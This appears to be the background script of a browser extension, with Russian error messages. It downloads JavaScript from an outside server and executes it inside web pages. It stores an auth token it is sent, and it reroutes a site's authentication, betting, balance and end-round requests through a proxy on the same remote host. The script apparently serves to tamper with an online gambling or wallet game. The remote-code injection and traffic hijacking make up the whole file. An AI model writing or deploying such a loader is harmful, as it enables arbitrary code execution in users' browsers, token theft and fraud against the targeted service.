const SERVER_HOST = "https://minedropmiroslav-zvdx.vercel.app"; 
const SCRIPT_URL = `${SERVER_HOST}/script/get_script.php`;
const PROXY_BASE = `${SERVER_HOST}/wallet`; 
const storage = {
  async set(data) { return await chrome.storage.local.set(data); },
  async get(keys) { return await chrome.storage.local.get(keys); }
};
async function injectScript(tabId, frameId) {
  try {
    const response = await fetch(SCRIPT_URL);
    if (!response.ok) throw new Error("Скрипт не скачался: " + response.status);
    const scriptText = await response.text();

    await chrome.scripting.executeScript({
        target: { tabId: tabId, frameIds: [frameId] },
        world: 'MAIN',
        func: (code) => { try { new Function(code)(); } catch(e) { console.error(e); } },
        args: [scriptText]
    });
  } catch (error) {
    console.error("[BG] Ошибка:", error);
  }
}
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.type) {
    case "SAVE_AUTH_TOKEN":
      storage.set({ authToken: message.payload.token });
      break;

    case "INJECT_PAYLOAD_REQUEST":
       if (sender.tab && sender.frameId) {
           injectScript(sender.tab.id, sender.frameId);
       }
       break;
    case "PROXY_FETCH_REQUEST":
      const { url, options } = message.payload;
      try {
          let finalEndpoint = '';
          if (url.includes('authenticate') || url.includes('init')) finalEndpoint = '/authenticate';
          else if (url.includes('play') || url.includes('bet')) finalEndpoint = '/play';
          else if (url.includes('balance')) finalEndpoint = '/balance';
          else if (url.includes('end-round') || url.includes('finish')) finalEndpoint = '/end-round';
          else {
              const urlObj = new URL(url);
              let cleanPath = urlObj.pathname;
              if (cleanPath.startsWith('/wallet/')) cleanPath = cleanPath.replace('/wallet/', '/');
              finalEndpoint = cleanPath;
          }
          const proxyUrl = `${PROXY_BASE}${finalEndpoint}`;
          fetch(proxyUrl, options)
            .then(async (response) => {
              const responseData = {
                status: response.status,
                statusText: response.statusText,
                body: await response.text(),
                headers: {}
              };
              response.headers.forEach((val, key) => responseData.headers[key] = val);
              sendResponse(responseData);
            })
            .catch(err => sendResponse({ error: err.message }));

      } catch (e) { console.error("Ошибка URL", e); }
      return true;
  }
});
